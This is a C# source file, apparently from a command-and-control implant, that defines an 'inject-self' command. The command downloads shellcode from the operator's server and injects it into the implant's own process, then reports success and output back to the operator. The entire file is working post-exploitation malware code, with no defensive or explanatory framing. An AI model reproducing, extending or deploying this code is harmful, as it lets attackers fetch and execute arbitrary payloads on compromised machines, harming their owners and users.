﻿using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SelfInjectCommand : AgentCommand
    {
        public override string Name => "inject-self";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (task.SplittedArgs.Length == 0)
            {
                result.Result = $"Usage: {this.Name} Path_Of_ShellCode_On_Server";
                return;
            }

            var fileName = task.SplittedArgs[0];
            var fileContent = commm.Download(fileName, a =>
            {
                result.Info = $"Downloading {fileName} ({a}%)";
                commm.SendResult(result);
            }).Result;

            this.Notify(result, commm, $"{fileName} Downloaded");

            var shellcode = fileContent;

            var injectRes =  Injector.InjectSelfWithOutput(fileContent);
            if(!injectRes.Succeed)
                result.Result += $"Injection failed : {injectRes.Error}";
            else
            {
                result.Result += $"Injection succeed!" + Environment.NewLine;
                if (!string.IsNullOrEmpty(injectRes.Output))
                    result.Result += injectRes.Output;
            }
        }
    }
}
